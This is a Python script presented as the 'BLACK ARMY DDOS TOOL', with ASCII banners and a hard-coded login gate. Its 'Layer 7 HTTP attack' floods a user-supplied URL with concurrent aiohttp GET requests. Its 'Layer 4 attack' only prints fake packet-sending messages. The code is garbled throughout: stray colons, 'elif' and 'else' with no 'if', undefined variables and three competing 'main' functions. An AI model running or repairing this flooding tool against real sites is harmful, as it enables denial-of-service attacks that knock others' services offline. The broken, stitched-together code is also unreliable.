import aiohttp
import asyncio
import time
import os
import random
import sys
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# ============================
#   Typing Animation
# ============================
def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print(massage)  # newline

# ============================
#   Banner ASCII
# ============================
attemps = 0
os.system("clear")
def display_header():
    header_lines = [
        Fore.BLACK + "═══════════════════════════════════════════════════════════════════",     
        Fore.YELLOW + "    ",
        Fore.YELLOW + "       ╔══" + Fore.MAGENTA + "         ╔═══════╗" + Fore.GREEN + "    ╔════╗ ╔════╗" + Fore.WHITE + " ╔══╗" + Fore.BLUE + " ╔═══╗     ╔══╗",
        Fore.YELLOW + "       ███ ║" + Fore.MAGENTA + "      ████████ ║" + Fore.GREEN + "   █████ ║█████ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ████ ║    ██ ║ ",
        Fore.YELLOW + "      ██ ██ ║" + Fore.MAGENTA + "     ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ██ ║   ██ ║ ",
        Fore.YELLOW + "     ██ ║ ██ ║" + Fore.MAGENTA + "    ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██  ██ ║  ██ ║   ",
        Fore.YELLOW + "    ██ ╚══ ██ ║" + Fore.MAGENTA + "   ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║ ██ ║ ██ ║ ",
        Fore.YELLOW + "   ███████  ██ ║" + Fore.MAGENTA + "  ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██═╝ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║  ██ ║██ ║ ",
        Fore.YELLOW + "  ██ ║       ██ ║" + Fore.MAGENTA + " ██ ╚════██ ║" + Fore.GREEN + " ██ ║      ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║   ██ ██ ║ ",
        Fore.YELLOW + " ██═╝         ██═╝" + Fore.MAGENTA + "████████═╝" + Fore.GREEN + "   ██═╝      ██═╝" + Fore.WHITE + " ██═╝" + Fore.BLUE + " ██═╝    ████═╝ ",
        Fore.YELLOW + "    ",
        Fore.RED + "        ██═╗    ██═╗" + Fore.WHITE + "     ████═╗" + Fore.BLUE + "      ███████ ║" + Fore.YELLOW + "  ██═╗   ██═╗ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "    ██ ╔═██ ║" + Fore.BLUE + "   ██ ╔═════╝" + Fore.YELLOW + "  ██ ║  ██ ║ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ████ ║ ",
        Fore.RED + "        ██████████ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║ ",
        Fore.RED + "        ██ ╔════██ ║" + Fore.WHITE + "   ██████ ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║  ██ ║ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "   ███████ ║" + Fore.YELLOW + "  ██ ║   ██ ║ ",
        Fore.RED + "        ╚══╝    ╚══╝" + Fore.WHITE + "   ╚══╝   ╚══╝" + Fore.BLUE + "   ╚═══════╝" + Fore.YELLOW + "  ╚══╝   ╚══╝ ",
        Fore.BLACK + "══════════════════════════════════════════════════════════════════",     
    ]
    for line in header_lines:
        print(line)
        time.sleep(0.0015)  # typing effect
        print(f"\033[37m╔{'═' * 66}╗")
print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
print(f"\033[37m╚{'═' * 66}╝")
while attemps < 100:
    username = input("\033[100m \033[32m••> Enter your username: \033[33m \033[0m")
    password = input("\033[100m \033[31m••> Enter your password: \033[33m \033[0m")

    if username == 'tc4teen' and password == 'tc4teen':
        print("\033[104m \033[32m DEDICATED TO THE PALESTINE STRUGGLE \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

#=============================
#   Layer 4 Stress Tes
# ============================
def main():
    clear()
    if choice == "1":   
        display_header():
        header_lines = [
        Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
        Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
     ]
    for line in header_lines:
        print(line)
        time.sleep(0.0015)  # typing effe
        target_ip = input("===⟩\033[32m IP: \033[33m")
        duration = int(input("===⟩\033[321m Duration: \033[33m"))
        layer4_attack(target_ip, duration)

def layer4_attack(target_ip, duration):
    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
    start_time = time.time()
    while time.time() - start_time < duration:
        port = random.randint(20, 65535)
        CSS = random.randint(64, 1500)
        print(Fore.YELLOW + f"[] LAYER 4 {Fore.WHITE}ADMIN-HACK {Fore.BLUE} SEN-PACKET {Fore.GREEN} {CSS} {Fore.RED} BYTES TO {target_ip}:{port} {Fore.WHITE}Running ::")
        print(Fore.RED + f"[] LAYER 4 {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {CSS} {Fore.WHITE} BYTES TO {target_ip}:{port} {Fore.GREEN}Running :::")
        time.sleep(0.2)
    print(Fore.GREEN + "\n[✔] LAYER 4 \033[1;31m F I N N A L Y  AT T A C K !\n")
    print(Fore.RED + "\n[!] Invalid choice.")
   
# ============================
#   Layer 7 Stress Test
# ============================
def main():
    clear()
    elif choice == "2":
          display_header():
          header_lines = [
          Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
          Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
    ]
    for line in header_lines:
        print(line)
        time.sleep(0.0015)  # typing effe   
        url = input("==⟩ \033[32mURL: \033[33m")
        concurrency = int(input("==⟩ \033[32mSize: \033[33m"))
        duration = int(input("==⟩ \033[32mDuration: \033[33m"))
        asyncio.run(layer7_attack(url, concurrency, duration))
                  
async def worker(session, url, stop_time):
    hits = 0
    while time.time() < stop_time:
        try:
            async with session.get(url) as resp:
                await resp.text()
                hits += 1
                print(Fore.RED + f"[÷] {Fore.BLUE} LAYER7 {Fore.CYAN}ADMIN-HACK {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
                print(Fore.WHITE + f"[÷] {Fore.YELLOW} LAYER7 {Fore.WHITE}ADMIN-HACK {Fore.BLUE}REQUEST-SENT {Fore.YELLOW} {url} {Fore.GREEN}Running :")
        except:
            print(Fore.RED + f"[x] {Fore.GREEN}LAYER7 {Fore.YELLOW}Request failed =⟩ {Fore.RED} {url} {Fore.WHITE} Down..!")
    return hits

async def layer7_attack(url, concurrency, duration):
    stop_time = time.time() + duration
    async with aiohttp.ClientSession() as session:
        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    print(Fore.WHITE + f"\n[✔] Total requests sent: {sum(results)}")
    print(Fore.RED + "\n[!] Invalid choice.")
 
# ============================
#   Menu Utama
# ============================
def main():
    clear()
    display_header()
    print(Fore.MAGENTA + Style.BRIGHT + "=== ⚔️ BLACK ARMY DDOS TOOL ===")
    print(Fore.YELLOW + "1. Layer 4 Attack")
    print(Fore.CYAN + "2. Layer 7 HTTP Attack")
    choice = input(Fore.WHITE + "\nSelect option: ")

    else:
        print(Fore.RED + "\n[!] Invalid choice.")

if __name__ == "__main__":
    main()
